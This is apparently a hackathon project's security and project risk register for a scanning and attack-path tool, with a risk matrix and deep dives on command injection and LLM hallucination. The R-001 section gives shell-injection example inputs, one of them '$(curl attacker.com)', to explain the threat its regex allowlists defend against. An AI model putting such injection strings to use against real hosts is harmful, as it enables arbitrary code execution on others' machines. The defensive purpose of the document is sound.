# Comprehensive Project & Security Risk Register — Domain-Vihaan_X

> **Document ID:** RISK-001  
> **Project Name:** Domain-Vihaan_X  
> **Domain:** Cybersecurity (VIHAAN X Hackathon)  
> **Status:** ACTIVE REGISTER  
> **Last Updated:** 2026-11-14T23:56:00+05:30  
> **Risk Scoring Guide:** Severity = Probability $\times$ Impact (Categorized as CRITICAL, HIGH, MEDIUM, LOW)  

---

## 1. Master Risk Matrix

| Risk ID | Risk Category | Risk Description | Prob. | Impact | Severity | Mitigation Strategy | Owner | Status |
| :--- | :--- | :--- | :--- | :--- | :--- | :--- | :--- | :--- |
| **R-001** | Security / Vulnerability | **HexStrike-AI Command Injection:** Unsanitized parameters passed to HexStrike allow remote code execution on the host machine. | Medium | Critical | **CRITICAL** | Strict localhost binding, API key authentication, and target allowlisting; input arguments validated via strict regex allowlists; no raw shell interpolation. | Dev A | **ACTIVE** |
| **R-002** | Legal / Operational | **Unauthorized Target Scanning:** Scanners triggered against third-party public domains or unconsented IP ranges. | Low | Critical | **CRITICAL** | Hardcoded target allowlist guard enforcing canonical path/domain matching; API rejects non-whitelisted targets with HTTP 403. | Dev A | **ACTIVE** |
| **R-003** | Data Privacy | **Production Data Exposure:** Real customer credentials or sensitive production keys committed or printed in logs. | Low | Critical | **CRITICAL** | Exclusive use of synthetic test fixtures; zero real production credentials stored; automatic secret redaction filter before database write. | Shared | **ACTIVE** |
| **R-004** | Execution / Demo | **Demo Environment Failure:** Live scanner binaries fail, time out, or throw errors during the 6-minute evaluation presentation. | Medium | Critical | **HIGH** | Self-contained synthetic test environment (`mock_saas/`); pre-cached scanner JSON fallback fixtures in `test_env/fixtures/`; offline SQLite DB. | Shared | **ACTIVE** |
| **R-005** | Schedule / Program | **Time Constraints (9-Hour Window):** Scope creep prevents completing both backend and frontend before the 09:00 AM IST deadline. | High | High | **HIGH** | MVP scope strictly locked to 3 domains (ADR-001); contract-first parallel development with mock data; P1/P2 features ruthlessly deferred. | Shared | **ACTIVE** |
| **R-006** | AI / Trust | **AI Hallucinations in Exploit Paths:** LLM invents non-existent CVEs, fake attack edges, or hallucinates exploit chains. | Medium | High | **HIGH** | Structured prompt architecture with XML boundary isolation; LLM restricted strictly to explaining verified JSON findings; deterministic fallback rules. | Dev A | **ACTIVE** |
| **R-007** | Quality / Accuracy | **Incorrect Attack-Path Correlation:** Graph engine synthesizes illogical links (e.g., secret connects to unrelated storage). | Medium | High | **HIGH** | Strict provenance tracking on edges (`CONFIG_DERIVED`, `SEEDED_MANIFEST`); relationship validation logic; comprehensive unit tests (`UT-007`). | Dev A | **ACTIVE** |
| **R-008** | Environment / Infra | **HexStrike Availability Discrepancy:** HexStrike service is not running or accessible on the host machine. | High | Medium | **HIGH** | Control Plane decoupled from HexStrike (ADR-003); system operates 100% on native CLI runners (Gitleaks, Checkov) if HexStrike adapter fails. | Dev A | **ACTIVE** |
| **R-009** | Quality / Usability | **Scanner False Positives Overwhelming UI:** Scanners return hundreds of irrelevant alerts, cluttering the graph. | High | Medium | **MEDIUM** | Intelligent thresholding: only findings connected to an active attack path or with CRS >= 7.0 are highlighted on the main graph canvas. | Dev B | **ACTIVE** |
| **R-010** | Integration / System | **Scanner Subprocess Hanging / Memory Leak:** Long-running CLI tools consume all CPU/RAM, freezing the FastAPI server. | Medium | High | **MEDIUM** | Process supervisor enforces hard 60s timeout with `proc.kill()`; memory output capped at 10MB; `shell=False` enforced. | Dev A | **ACTIVE** |
| **R-011** | Application / UI | **React Flow Graph Layout Collapse:** Complex edge connections produce unreadable overlapping node spaghettis. | Medium | Medium | **MEDIUM** | Pre-computed static layout coordinates for synthetic demo assets; hierarchical DAG layout algorithm for dynamic graphs. | Dev B | **ACTIVE** |
| **R-012** | Security / Control | **Uncontrolled Remediation Patch:** Automated patch introduces syntax errors or breaks infrastructure. | Medium | Medium | **MEDIUM** | Human-in-the-loop approval gate (ADR-007); unified diff preview before approval; automated syntax lint prior to patch application. | Dev A | **ACTIVE** |
| **R-013** | Software Supply Chain | **Dependency or Python Version Incompatibility:** Local host lacks compatible Python 3.11+ or Node.js versions. | Low | High | **MEDIUM** | Minimal dependency set pinned in `requirements.txt` and `package.json`; no complex C-extensions; verified on local Windows Antigravity host. | Shared | **ACTIVE** |

---

## 2. In-Depth Analysis of Critical Security Risks

### Deep Dive: Risk R-001 — HexStrike-AI Command Execution Vulnerabilities
- **Threat Vector:** Public security research and vulnerability disclosures have highlighted potential command injection vulnerabilities in penetration testing orchestration frameworks where user-supplied URLs or parameter flags are passed directly to underlying shells.
- **Vulnerability Mechanics in HexStrike:** If an attacker or malicious user supplies a target locator containing shell metacharacters (e.g., `127.0.0.1 && id` or `$(curl attacker.com)`), an unsanitized wrapper could execute arbitrary code under the host user's privileges.
- **Specific Platform Mitigations:**
  1. **Strict Input Sanitization:** All locators passed to the HexStrike adapter must match strict regex patterns:
     - IP Address: `^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$`
     - Domain: `^[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$`
  2. **Zero Shell Interpolation:** The HexStrike adapter interacts exclusively via REST JSON-RPC over `127.0.0.1` or parameterized arrays, never via shell string concatenation.
  3. **No Public Network Exposure:** HexStrike is never bound to `0.0.0.0` and never exposed via reverse proxies to the public internet.

---

### Deep Dive: Risk R-006 — AI Hallucinations in Security Explanations
- **Threat Vector:** Large language models frequently hallucinate plausible-sounding CVEs, misinterpret CVSS severities, or falsely claim that an air-gapped system is exploitable over the internet.
- **Business Impact:** Misleads engineering teams into wasting hours investigating fictitious vulnerabilities or ignoring genuine risks.
- **Specific Platform Mitigations:**
  1. **Deterministic Risk Separation:** Numerical scoring is calculated 100% via the deterministic formula in `app/risk/engine.py`. The LLM is prohibited from calculating or modifying scores.
  2. **Grounded Prompt Context:** The LLM prompt is supplied with exact JSON finding objects. The system prompt enforces:
     > *"You are an objective security analyst. You must base your technical explanation strictly and exclusively on the findings and relationships provided in the <evidence> block. If a relationship is not present, you must state that it is unverified. Never cite CVEs or IPs not present in the input."*
  3. **Pydantic Validation:** LLM responses are parsed into `AIAnalysisResponse`. Any missing keys or malformed JSON triggers an immediate fallback to a pre-compiled rule template.
